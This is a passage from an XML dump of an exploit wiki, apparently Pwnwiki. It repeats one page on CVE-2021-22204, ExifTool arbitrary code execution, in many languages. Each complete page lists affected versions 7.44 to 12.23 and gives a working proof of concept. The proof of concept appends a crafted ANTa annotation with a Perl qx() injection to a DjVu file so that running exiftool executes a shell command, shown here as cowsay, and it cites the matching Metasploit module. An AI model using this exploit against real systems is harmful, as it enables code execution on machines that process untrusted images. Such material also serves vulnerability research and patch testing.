    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/bs</title>
    <ns>0</ns>
    <id>2643</id>
    <revision>
      <id>3142</id>
      <timestamp>2021-05-23T02:31:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool ranjivost izvršenja proizvoljnog koda"</comment>
      <origin>3142</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="pe3srmv8hsvcjkmjk6oepu29ef201ec" xml:space="preserve">&lt;languages /&gt;

== Pogođena verzija ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>pe3srmv8hsvcjkmjk6oepu29ef201ec</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ca</title>
    <ns>0</ns>
    <id>2710</id>
    <revision>
      <id>3209</id>
      <timestamp>2021-05-23T02:56:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versió afectada =="</comment>
      <origin>3209</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="586" sha1="efxp373m2ojsy0sciymlo02t5ink36n" xml:space="preserve">&lt;languages /&gt;

== Versió afectada ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>efxp373m2ojsy0sciymlo02t5ink36n</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ckb</title>
    <ns>0</ns>
    <id>2719</id>
    <revision>
      <id>3218</id>
      <timestamp>2021-05-23T03:05:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Guhertoya bandorbûyî =="</comment>
      <origin>3218</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="592" sha1="cww48n2svjp1s0eggbxid1cube8z392" xml:space="preserve">&lt;languages /&gt;

== Guhertoya bandorbûyî ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>cww48n2svjp1s0eggbxid1cube8z392</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/co</title>
    <ns>0</ns>
    <id>2648</id>
    <revision>
      <id>3147</id>
      <timestamp>2021-05-23T02:32:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versione affettata =="</comment>
      <origin>3147</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="588" sha1="ecaknl7qpmqb9vetv4hjkdtyb34wofg" xml:space="preserve">&lt;languages /&gt;

== Versione affettata ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>ecaknl7qpmqb9vetv4hjkdtyb34wofg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/cs</title>
    <ns>0</ns>
    <id>2723</id>
    <revision>
      <id>3222</id>
      <timestamp>2021-05-23T03:44:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 Chyba zabezpečení ExifTool při spuštění libovolného kódu"</comment>
      <origin>3222</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="585" sha1="nu3va6glacvvekaw60kxvnjkemkrca8" xml:space="preserve">&lt;languages /&gt;

== Dotčená verze ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>nu3va6glacvvekaw60kxvnjkemkrca8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/da</title>
    <ns>0</ns>
    <id>2634</id>
    <revision>
      <id>3133</id>
      <timestamp>2021-05-23T02:28:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Berørt version =="</comment>
      <origin>3133</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="585" sha1="q6xbcnbgjkg54e5ybcdabn436dxi5ux" xml:space="preserve">&lt;languages /&gt;

== Berørt version ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>q6xbcnbgjkg54e5ybcdabn436dxi5ux</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/de</title>
    <ns>0</ns>
    <id>2696</id>
    <revision>
      <id>3195</id>
      <timestamp>2021-05-23T02:46:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Betroffene Version =="</comment>
      <origin>3195</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="588" sha1="hl4ebvceg76wrh457zusm8e8r8q6qp3" xml:space="preserve">&lt;languages /&gt;

== Betroffene Version ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>hl4ebvceg76wrh457zusm8e8r8q6qp3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/el</title>
    <ns>0</ns>
    <id>2697</id>
    <revision>
      <id>3196</id>
      <timestamp>2021-05-23T02:46:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Επηρεασμένη έκδοση =="</comment>
      <origin>3196</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="605" sha1="jiaf1tye7sbnfntupenqjtt9tlzv3xk" xml:space="preserve">&lt;languages /&gt;

== Επηρεασμένη έκδοση ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>jiaf1tye7sbnfntupenqjtt9tlzv3xk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>4096</id>
    <revision>
      <id>4714</id>
      <timestamp>2021-06-10T04:57:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Affected Versions=="</comment>
      <origin>4714</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="585" sha1="9tcm8szc7v7oet8ucglav3b5ra5tajv" xml:space="preserve">&lt;languages /&gt;

==Affected Versions==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>9tcm8szc7v7oet8ucglav3b5ra5tajv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/es</title>
    <ns>0</ns>
    <id>2734</id>
    <revision>
      <id>3233</id>
      <timestamp>2021-05-23T05:05:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool vulnerabilidad de ejecución de código arbitrario"</comment>
      <origin>3233</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="ek8gmghdkfexhe67klz60hol8yz8fbx" xml:space="preserve">&lt;languages /&gt;

== Versión afectada ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>ek8gmghdkfexhe67klz60hol8yz8fbx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/et</title>
    <ns>0</ns>
    <id>2617</id>
    <revision>
      <id>3116</id>
      <timestamp>2021-05-23T02:23:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Mõjutatud versioon =="</comment>
      <origin>3116</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="589" sha1="gohgz9nvc0cs8efhz6vx83pnty2rfbu" xml:space="preserve">&lt;languages /&gt;

== Mõjutatud versioon ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>gohgz9nvc0cs8efhz6vx83pnty2rfbu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/eu</title>
    <ns>0</ns>
    <id>2678</id>
    <revision>
      <id>3177</id>
      <timestamp>2021-05-23T02:41:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Kaltetutako bertsioa =="</comment>
      <origin>3177</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="590" sha1="0x2e4a29qhk8pit6z4ba39g1gv4ovyn" xml:space="preserve">&lt;languages /&gt;

== Kaltetutako bertsioa ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>0x2e4a29qhk8pit6z4ba39g1gv4ovyn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/fa</title>
    <ns>0</ns>
    <id>2732</id>
    <revision>
      <id>3231</id>
      <timestamp>2021-05-23T04:45:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== نسخه تحت تأثیر =="</comment>
      <origin>3231</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="596" sha1="65ao16qfedpsx13av6jocbxfo5c52sc" xml:space="preserve">&lt;languages /&gt;

== نسخه تحت تأثیر ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>65ao16qfedpsx13av6jocbxfo5c52sc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/fi</title>
    <ns>0</ns>
    <id>2715</id>
    <revision>
      <id>3214</id>
      <timestamp>2021-05-23T03:00:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool mielivaltaisen koodin suorittamisen haavoittuvuus"</comment>
      <origin>3214</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="7sn6bv83y9ogpcdo6kv0ze88nxvrkyp" xml:space="preserve">&lt;languages /&gt;

== Vaikuttava versio ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>7sn6bv83y9ogpcdo6kv0ze88nxvrkyp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/fr</title>
    <ns>0</ns>
    <id>2562</id>
    <revision>
      <id>3061</id>
      <timestamp>2021-05-23T02:02:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Version affectée=="</comment>
      <origin>3061</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="585" sha1="35wnlqipnbvzlg95767lf44ge3twhv9" xml:space="preserve">&lt;languages /&gt;

==Version affectée==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>35wnlqipnbvzlg95767lf44ge3twhv9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/fy</title>
    <ns>0</ns>
    <id>2652</id>
    <revision>
      <id>3151</id>
      <timestamp>2021-05-23T02:33:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Betroffen ferzje =="</comment>
      <origin>3151</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="586" sha1="mhbmqew5cl3rxsevgfmwh4yjx5j6fig" xml:space="preserve">&lt;languages /&gt;

== Betroffen ferzje ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>mhbmqew5cl3rxsevgfmwh4yjx5j6fig</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ga</title>
    <ns>0</ns>
    <id>2579</id>
    <revision>
      <id>3078</id>
      <timestamp>2021-05-23T02:09:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 Leochaileacht forghníomhaithe cód treallach ExifTool"</comment>
      <origin>3078</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="591" sha1="5hrb67ye0ab6fc5q25fwn0q24fka6x2" xml:space="preserve">&lt;languages /&gt;

== Leagan lena mbaineann ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>5hrb67ye0ab6fc5q25fwn0q24fka6x2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/gl</title>
    <ns>0</ns>
    <id>2668</id>
    <revision>
      <id>3167</id>
      <timestamp>2021-05-23T02:38:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versión afectada =="</comment>
      <origin>3167</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="ek8gmghdkfexhe67klz60hol8yz8fbx" xml:space="preserve">&lt;languages /&gt;

== Versión afectada ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>ek8gmghdkfexhe67klz60hol8yz8fbx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/gu</title>
    <ns>0</ns>
    <id>2709</id>
    <revision>
      <id>3208</id>
      <timestamp>2021-05-23T02:54:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool મનસ્વી કોડ અમલ નબળાઈ"</comment>
      <origin>3208</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="619" sha1="ovdookqv90id2xj6xlwxsu0xk0fjzpo" xml:space="preserve">&lt;languages /&gt;

== અસરગ્રસ્ત સંસ્કરણ ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>ovdookqv90id2xj6xlwxsu0xk0fjzpo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ha</title>
    <ns>0</ns>
    <id>2653</id>
    <revision>
      <id>3152</id>
      <timestamp>2021-05-23T02:33:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Sigar da ta shafi =="</comment>
      <origin>3152</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="2dtr2xqp1z36h13lgxtdbk6cq0g88hz" xml:space="preserve">&lt;languages /&gt;

== Sigar da ta shafi ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>2dtr2xqp1z36h13lgxtdbk6cq0g88hz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/he</title>
    <ns>0</ns>
    <id>2599</id>
    <revision>
      <id>3098</id>
      <timestamp>2021-05-23T02:16:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 פגיעות של ביצוע קוד שרירותי ExifTool"</comment>
      <origin>3098</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="589" sha1="rwburmcstyps2qf8dw1qjjdxrfaxvo9" xml:space="preserve">&lt;languages /&gt;

==גרסה מושפעת==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>rwburmcstyps2qf8dw1qjjdxrfaxvo9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/hr</title>
    <ns>0</ns>
    <id>2662</id>
    <revision>
      <id>3161</id>
      <timestamp>2021-05-23T02:36:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool ranjivost izvršenja proizvoljnog koda"</comment>
      <origin>3161</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="pe3srmv8hsvcjkmjk6oepu29ef201ec" xml:space="preserve">&lt;languages /&gt;

== Pogođena verzija ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
